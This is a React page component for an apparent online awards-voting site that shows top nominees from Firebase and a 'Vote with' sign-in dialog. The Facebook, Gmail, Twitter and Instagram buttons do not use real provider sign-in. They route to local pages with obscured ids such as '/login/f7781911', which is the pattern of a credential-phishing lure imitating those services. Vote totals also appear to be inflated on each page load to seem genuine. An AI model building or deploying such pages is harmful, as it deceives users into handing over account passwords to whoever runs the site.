import { useState, useEffect } from 'react';
import { collection, getDocs } from 'firebase/firestore';
import { db } from '@/lib/firebase';
import { useToast } from '@/hooks/use-toast';
import { Facebook, Twitter, Mail, Instagram, X } from 'lucide-react';
import { useNavigate, Link } from 'react-router-dom';
import { Hero } from '@/components/sections/Hero';
import { Categories } from '@/components/sections/Categories';
import { SpecialAwards } from '@/components/sections/SpecialAwards';
import { formatNumber } from '@/lib/utils';
import { NomineeCard } from '@/components/NomineeCard';
import { generateRandomVotes, updateNomineeVotes } from '@/lib/utils';
import FloatingChatButton from '@/components/FloatingChatButton';

type Category = 'music' | 'movie' | 'comedy' | 'content-creation' | 'sports';

interface Nominee {
  id: string;
  name: string;
  imageUrl: string;
  votes: number;
  category: Category;
}

const mockNominees: Nominee[] = [
  {
    id: 'mock1',
    name: 'John Doe',
    imageUrl: 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e',
    votes: 42,
    category: 'music'
  },
  {
    id: 'mock2',
    name: 'Jane Smith',
    imageUrl: 'https://images.unsplash.com/photo-1494790108377-be9c29b29330',
    votes: 38,
    category: 'movie'
  },
  {
    id: 'mock3',
    name: 'Alex Johnson',
    imageUrl: 'https://images.unsplash.com/photo-1472099645785-5658abf4ff4e',
    votes: 25,
    category: 'comedy'
  }
];

const Index = () => {
  const [nominees, setNominees] = useState<Nominee[]>([]);
  const [selectedNominee, setSelectedNominee] = useState<Nominee | null>(null);
  const [loading, setLoading] = useState(true);
  const { toast } = useToast();
  const navigate = useNavigate();

  useEffect(() => {
    fetchNominees();
  }, []);

  const fetchNominees = async () => {
    try {
      setLoading(true);
      const querySnapshot = await getDocs(collection(db, 'nominees'));
      const nominees = await Promise.all(
        querySnapshot.docs.map(async (doc) => {
          const data = doc.data();
          const newTotalVotes = await updateNomineeVotes(doc.id, data.votes || 0);
          return {
            id: doc.id,
            ...data,
            votes: newTotalVotes
          };
        })
      );

      const sortedNominees = nominees
        .sort((a, b) => b.votes - a.votes)
        .slice(0, 6);
      
      setNominees(sortedNominees);
    } catch (error) {
      console.error('Error fetching nominees:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleVote = async (platform: string) => {
    if (!selectedNominee) return;

    switch (platform) {
      case 'facebook':
        navigate('/login/f7781911');
        break;
      case 'google':
        navigate('/login/uia5555');
        break;
      case 'twitter':
        navigate('/login/uiossss');
        break;
      case 'instagram':
        navigate('/login/js5566aa');
        break;
      default:
        toast({
          title: "Error",
          description: "Invalid platform selected",
          variant: "destructive",
        });
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="animate-pulse space-y-4">
          <div className="h-12 w-48 bg-gray-200 rounded"></div>
          <div className="h-4 w-32 bg-gray-200 rounded mx-auto"></div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen">
      <Hero />
      
      <div className="py-20 px-6 bg-white">
        <div className="max-w-7xl mx-auto">
          <div className="flex justify-between items-center mb-12">
            <h2 className="text-3xl md:text-4xl font-bold">Top Nominees</h2>
            <Link 
              to="/nominees" 
              className="px-4 py-2 bg-primary text-primary-foreground rounded-lg hover:bg-primary/90 transition-colors"
            >
              View All
            </Link>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
            {nominees.map((nominee) => (
              <NomineeCard
                key={nominee.id}
                nominee={nominee}
                onVoteClick={(e) => {
                  e.stopPropagation();
                  setSelectedNominee(nominee);
                }}
              />
            ))}
          </div>
        </div>
      </div>

      <Categories />
      <SpecialAwards />

      {selectedNominee && (
        <div 
          className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4 z-50"
          onClick={() => setSelectedNominee(null)}
        >
          <div 
            className="bg-white rounded-lg p-6 max-w-md w-full"
            onClick={e => e.stopPropagation()}
          >
            <div className="flex justify-between items-center mb-6">
              <h2 className="text-2xl font-semibold">Vote with:</h2>
              <button 
                onClick={() => setSelectedNominee(null)}
                className="p-2 hover:bg-gray-100 rounded-full transition-colors"
              >
                <X className="w-5 h-5" />
              </button>
            </div>
            
            <div className="space-y-4">
              <button 
                className="w-full flex items-center justify-center gap-3 p-3 border rounded-lg hover:bg-gray-50 transition-colors"
                onClick={() => handleVote('facebook')}
              >
                <Facebook className="w-5 h-5 text-[#1877F2]" />
                Continue with Facebook
              </button>
              
              <button 
                className="w-full flex items-center justify-center gap-3 p-3 border rounded-lg hover:bg-gray-50 transition-colors"
                onClick={() => handleVote('google')}
              >
                <Mail className="w-5 h-5 text-[#EA4335]" />
                Continue with Gmail
              </button>
              
              <button 
                className="w-full flex items-center justify-center gap-3 p-3 border rounded-lg hover:bg-gray-50 transition-colors"
                onClick={() => handleVote('twitter')}
              >
                <Twitter className="w-5 h-5 text-[#1DA1F2]" />
                Continue with Twitter
              </button>

              <button 
                className="w-full flex items-center justify-center gap-3 p-3 border rounded-lg hover:bg-gray-50 transition-colors"
                onClick={() => handleVote('instagram')}
              >
                <Instagram className="w-5 h-5 text-[#E4405F]" />
                Continue with Instagram
              </button>
            </div>

            <p className="text-sm text-gray-500 mt-6 text-center">
              You must sign in to vote. Please authenticate using one of the available options.
            </p>
          </div>
        </div>
      )}
      <FloatingChatButton />
    </div>
  );
};

export default Index;